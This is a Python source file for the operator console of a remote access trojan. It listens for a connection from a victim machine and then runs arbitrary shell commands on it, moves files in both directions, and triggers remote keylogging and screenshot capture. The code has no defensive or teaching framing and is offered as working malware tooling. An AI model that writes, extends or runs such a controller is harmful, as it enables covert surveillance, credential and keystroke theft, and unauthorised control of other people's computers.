import time
import os
import subprocess
import threading
import socket
from colorama import Fore, Back, Style
from Banner import banner

encrypted_tunnel = False

connection_lst = []
address_lst = []


class Ruler(socket.socket):
    def __init__(self, IP, PORT, family, proto):
        socket.socket.__init__(self, family, proto)
        self.IP = IP
        self.PORT = PORT
        self.bind((self.IP, self.PORT))
        os.system('clear')
        self.loadBanner()
        self.listen(5)
        self.Accepting_Connection()

    def Accepting_Connection(self):
        self.conn, self.addr = self.accept()
        print("[+] Got a Connection from {}:{}".format(self.addr[0], self.addr[1]))
        self.Command()

    def loadBanner(self):
        # self.basicCommands['clear']
        print(Fore.RED+banner)
        print('\n')
        print(Fore.GREEN +
              "[+] Listening Connection on port {}".format(self.PORT))
        print("\n")

    def Command(self):
        while True:
            cmd = input("({})->".format(self.addr[0]))
            if cmd[:8] == "download":
                self.download(cmd)

            elif cmd[:6] == "upload":
                self.upload(cmd)
                continue

            elif cmd[:] == 'dir':
                self.conn.send('dir'.encode('utf-8'))
                path = self.conn.recv(2048)
                path = path.decode('utf-8')
                path = path.split('/n')
                for i in path:
                    print(i)

            elif cmd[:3] == 'msg':
                self.conn.send(cmd.encode('utf-8'))

            elif cmd[:] == 'clear':
                os.system('clear')
                self.loadBanner()

            elif cmd[:] == "screenshot":
                self.conn.send('screenshot'.encode('utf-8'))
                time.sleep(3)
                self.download('download sc.png')

            elif cmd[:] == "keylogger":
                self.conn.send('keylogger'.encode('utf-8'))
                time.sleep(2)
                self.download('download log.txt')

            elif cmd[:] == "bye":
                break

            elif len(cmd) > 0:
                self.conn.send(cmd.encode('utf-8'))
                data = self.conn.recv(2048)
                data = data.decode('utf-8')
                print(data)
            else:
                continue

        print(Fore.RED+"[+] Session Closed")
        self.conn.close()

    def upload(self, command):
        if os.path.isfile(command[7:]):
            self.conn.send(command.encode('utf-8'))
            data = self.conn.recv(2048)
            data = data.decode('utf-8')
            if data == "fsize":
                fsize = os.path.getsize(command[7:])
                print(fsize)
                self.conn.send(
                    str(fsize).encode('utf-8'))
                a = self.conn.recv(2048)
                with open(command[7:], 'rb') as f:
                    bytesTosend = f.read(2048)
                    self.conn.send(bytesTosend)
                    while bytesTosend != b"":
                        # print(bytesTosend)
                        bytesTosend = f.read(2048)
                        self.conn.send(bytesTosend)
                msg = self.conn.recv(2048)
                print(msg.decode('utf-8'))
        else:
            print("[+] No such file")

    def download(self, file):
        self.conn.send(file.encode('utf-8'))
        data = self.conn.recv(2048)
        data = data.decode('utf-8')
        if data[:6] == "EXISTS":
            con = input(
                "Do You want to download file is {} KB ?".format(data[7:]))
            if con == 'Y' or 'y':
                self.conn.send("Listening".encode('utf-8'))

                f = open(file[9:], 'wb')
                filedata = self.conn.recv(2048)
                totaldata = len(filedata)
                f.write(filedata)
                while totaldata < int(data[7:]):
                    filedata = self.conn.recv(2048)
                    totaldata += len(filedata)
                    f.write(filedata)
                print("DONE")


Ruler('127.0.0.1', 5003, socket.AF_INET, socket.SOCK_STREAM)
